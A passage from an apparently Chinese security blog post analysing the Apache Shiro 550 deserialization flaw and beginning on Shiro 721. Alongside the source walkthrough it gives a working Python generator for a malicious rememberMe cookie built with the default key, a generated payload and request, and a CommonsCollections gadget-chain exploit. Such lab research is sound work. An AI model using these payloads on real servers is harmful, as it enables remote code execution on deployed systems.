class="comment">// 将 Base64 编码的字符串解码为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入convertBytesToPrincipals方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取加密服务对象</span></span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 解密</span></span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对解密后的结果进行反序列化</span></span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830160136.png"><br>进入decrypt函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用解密方法进行解密</span></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830161101.png"><br>进入到JcaCipherService类的decrypt方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] encrypted = ciphertext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//No IV, check if we need to read the IV from the stream:</span></span><br><span class="line">    <span class="type">byte</span>[] iv = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isGenerateInitializationVectors(<span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span></span><br><span class="line">            <span class="comment">//is:</span></span><br><span class="line">            <span class="comment">// - the first N bytes is the initialization vector, where N equals the value of the</span></span><br><span class="line">            <span class="comment">// &#x27;initializationVectorSize&#x27; attribute.</span></span><br><span class="line">            <span class="comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span></span><br><span class="line">            <span class="comment">//the IV to decrypt the real ciphertext:</span></span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">ivSize</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">            <span class="type">int</span> <span class="variable">ivByteSize</span> <span class="operator">=</span> ivSize / BITS_PER_BYTE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//now we know how large the iv is, so extract the iv bytes:</span></span><br><span class="line">            iv = <span class="keyword">new</span> <span class="title class_">byte</span>[ivByteSize];</span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">encryptedSize</span> <span class="operator">=</span> ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedSize];</span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830163004.png"><br>这里的函数的大概意思是将传入的ciphertext分成iv和encrypted两部分，在传入重载的decrypt中进行解密</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Attempting to decrypt incoming byte array of length &quot;</span> +</span><br><span class="line">                (ciphertext != <span class="literal">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] decrypted = crypt(ciphertext, key, iv, javax.crypto.Cipher.DECRYPT_MODE);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="literal">null</span> ? <span class="literal">null</span> : ByteSource.Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里面就是进行AES解密的部分<br>回到convertBytesToPrincipals函数部分<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830170202.png"><br>进入deserialize中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830171114.png"><br>这里的getSerializer即获取序列化器，然后调用反序列化函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="comment">// 重点是这里   调用了readObject函数，也是触发各种恶意链的地方</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后返回至getRememberedPrincipals函数，得到了principal实例对象<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230830171558.png"><br>下面就是身份验证的步骤了<br><strong>总结</strong>：<br>获取remeberMe的值——&gt;base64解密——&gt;AES解密——&gt;反序列化</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="shiro-URLDNS"><a href="#shiro-URLDNS" class="headerlink" title="shiro+URLDNS"></a>shiro+URLDNS</h3><p>生成remeberMe的cookie值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remeberMe</span>(<span class="params">command, ysoserial_path</span>):</span><br><span class="line">    <span class="comment">#popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, ysoserial_path, &#x27;URLDNS&#x27;, command], stdout=subprocess.PIPE)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(command) &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    arr = [<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, ysoserial_path] + command</span><br><span class="line">    <span class="comment"># print(arr)</span></span><br><span class="line">    popen = subprocess.Popen(arr, stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = optparse.OptionParser(usage = <span class="string">&#x27;python3 %prog [-h] [-p path-ysoserial] [-m method] [-c command]&#x27;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--path-ysoserial&#x27;</span>, dest=<span class="string">&#x27;path&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;path ysoserial&#x27;</span>, default=<span class="string">&#x27;ysoserial.jar&#x27;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, dest=<span class="string">&#x27;command&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    parse.add_option(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--method&#x27;</span>, dest=<span class="string">&#x27;method&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;ysoserial method&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    options, args = parse.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> options.command <span class="keyword">or</span> <span class="keyword">not</span> options.method:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:python3 generate_remeberMe.py [-c command] [-m method]\n&#x27;</span>)</span><br><span class="line">        exit(<span class="string">&#x27;generate_remeberMe.py:error:missing a mandatory option(-c,-m).Use -h for basic and -hh for advanced help&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    args_list = [options.method, options.command]</span><br><span class="line">    <span class="built_in">print</span>(args_list)</span><br><span class="line">    payload = remeberMe(args_list, options.path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>

<p>运行脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 generate_remeberMe.py -p ../ysoserial-all.jar -m URLDNS -c http://q3kbhojx.eyes.sh </span><br></pre></td></tr></table></figure>

<p>生成的cookie值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rememberMe=zCmIVaHZRWaEDgG4ai9KtSyUBRDy64H02wKgeXOeABaFiUbjOXTdpaqi42ete4k8xF0C1u0HpWFOccMjPvGMmzgu7/wSbi4tYDGSanE+aVQU9VYD/L2mdOQyqYliPNelAmbnTNl8tVnQEA9wAbVDrvdJOObIeLNiHweoY6d7iOOXBym5GTjFrvI/<span class="number">5</span>+/bZ6PABVkVySJsjEOzs7cJdYI6JVyqnEVFwoZnWNDAj9oSwOkxsmKQ5zyV8WZQOD8ywANAotwPYrOGG21E9/50FJbOBCGhwxr4sCyrn2Y1GrG4DdZ37ykK+ebAJd7gQEMdlvbegYGn2v2fTGbwgpGEHC41q2Km1r62PRR3wJ99sp85yrX1unQdMVW0K+KAXvTEaIjRkVflhpgmA0v2A9L+G2rRfg==</span><br></pre></td></tr></table></figure>

<p>发送包进行请求</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">GET /samples_web_war/ HTTP/1.1</span><br><span class="line">Host: 192.168.3.136:8090</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=2B290CC9ACB7DC118345F067BAB9693C; rememberMe=zCmIVaHZRWaEDgG4ai9KtSyUBRDy64H02wKgeXOeABaFiUbjOXTdpaqi42ete4k8xF0C1u0HpWFOccMjPvGMmzgu7/wSbi4tYDGSanE+aVQU9VYD/L2mdOQyqYliPNelAmbnTNl8tVnQEA9wAbVDrvdJOObIeLNiHweoY6d7iOOXBym5GTjFrvI/5+/bZ6PABVkVySJsjEOzs7cJdYI6JVyqnEVFwoZnWNDAj9oSwOkxsmKQ5zyV8WZQOD8ywANAotwPYrOGG21E9/50FJbOBCGhwxr4sCyrn2Y1GrG4DdZ37ykK+ebAJd7gQEMdlvbegYGn2v2fTGbwgpGEHC41q2Km1r62PRR3wJ99sp85yrX1unQdMVW0K+KAXvTEaIjRkVflhpgmA0v2A9L+G2rRfg==</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>最后会在DNS平台上出现请求记录<br>发送包后代码的具体执行如上述cookie解密过程一致，先对设置的payload进行base64解密，然后再对其进行AES解密，最后将得到的字节码进行反序列化操作，调用readObject函数，触发URLDNS链</p>
<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><h3 id="关于resolveClass"><a href="#关于resolveClass" class="headerlink" title="关于resolveClass"></a>关于resolveClass</h3><p>再使用ObjectInputStream类的readObject函数进行反序列化的过程中，其中会进行resolveClass方法来查找类；在ObjectInputStream类的resolveClass方法中通过Class.forName来获取当前描述器所指代的类的Class对象，但是Shiro中重写了ObjectInputStream类的resolveClass方法，它采用的是ClassUtils.forName来查找<br>查看ClassResolvingObjectInputStream类的resolveClass函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入ClassUtils.forName函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn +</span><br><span class="line">                    <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> +</span><br><span class="line">                <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownClassException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里接受的参数类型是String类型，如果传入的是Transform数组，会报错，具体的细节在THREAD_CL_ACCESSOR.loadClass中</p>
<p>这里引入commons-collections:4.0，CC2链使用的是非数组形式，所以可以利用成功</p>
<p>与此同时，Shiro中自带的CommonsBeanutils组件也可使用对应的CB链去利用</p>
<h3 id="利用CC链"><a href="#利用CC链" class="headerlink" title="利用CC链"></a>利用CC链</h3><p>commons collections:3.2.1</p>
<p>参考wh1t3p1g文章，exp如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);<span class="comment">// 构造带有evil class bytes的TemplatesImpl</span></span><br><span class="line"><span class="comment">// 构造InvokerTransformer，填充无害的toString函数</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 构造LazyMap的factory为前面的InvokerTransformer</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"><span class="comment">// 填充TiedMapEntry的map（lazyMap）和key（TemplatesImpl）</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="comment">// 下述代码将entry填充到HashSet的node的key上，可以使得HashSet在put的时候调用TiedMapEntry的hashCode函数</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f2);</span><br><span class="line">Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(keyField);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"><span class="comment">// 将最终的触发函数newTransformer装载到InvokerTransformer上</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在Shiro1.2.5中，将默认的key改成了动态key，但还是存在反序列化问题</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Java安全之Shiro 550反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://www.cnblogs.com/nice0e3/p/13894507.html">Java安全之安全加密算法 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://goodapple.top/archives/139">Java反序列化漏洞——Shiro550 - 枫のBlog (goodapple.top)</a><br><a href="https://www.cnblogs.com/CoLo/p/15542615.html">Apache Shiro 反序列化漏洞分析 - Zh1z3ven - 博客园 (cnblogs.com)</a><br><a href="https://xilitter.github.io/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/index.html">shiro反序列化初探 | XiLitter</a><br><a href="https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Shiro 反序列化漏洞原理分析 - Geekby’s Blog</a></p>
<h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><p>编号：CVE-2019-12422<br>影响版本：Apache Shiro &lt;&#x3D; 1.4.1<br>流程：</p>
<ol>
<li>登录网站获取正确的Cookie值（remeberMe）</li>
<li>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</li>
<li>利用intermediary构造出恶意的反序列化密文作为Cookie</li>
<li>使用新的Cookie请求网站执行攻击</li>
</ol>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>版本下载地址：<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1">https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1</a><br>导入IDEA，加载包，启动Tomact，直接运行即可</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>在Shiro550中，密钥直接写在源码中，而在Shiro721中，密钥动态生成<br>查看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">    setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看generateNewKey方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Key <span class="title function_">generateNewKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> generateNewKey(getKeySize());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中这里的getKeySize是获取key的长度<br>再进入到重载的generateNewKey方法</p>
